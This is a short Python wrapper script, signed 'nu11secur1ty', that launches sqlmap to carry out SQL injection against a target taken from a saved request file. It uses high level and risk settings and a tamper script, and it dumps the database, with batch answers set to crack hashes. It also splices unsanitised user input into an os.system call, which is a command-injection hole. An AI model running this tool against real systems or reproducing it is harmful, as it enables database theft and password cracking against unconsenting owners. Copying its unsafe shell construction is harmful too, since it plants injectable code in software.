#!/usr/bin/python
# nu11secur1ty 2023-2024
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

print("The PoC process will be continue...\n")
time.sleep(3)

# Parameter
print(Fore.GREEN +"Put your special parameter for User-Agent, or press Enter to return to the menu...\n")
print(Style.RESET_ALL)

print(Fore.RED)
User_Agent = input()
print(Style.RESET_ALL)

# Here, you can modify your OWN injection construction!
# Your EXPLOIT ENVIRONMENT 
env = 'Y:\\Path-to-your-GoBMap1\\SQLi\\G0BurpSQLmaPI\\'
os.system('python Y:\\your-sqlmap-nu11secur1ty-app\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt --tamper=space2comment --user-agent='+User_Agent+' --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')

print(Fore.RED +"Happy hunting with nu11secur1ty =)")
print(Style.RESET_ALL)
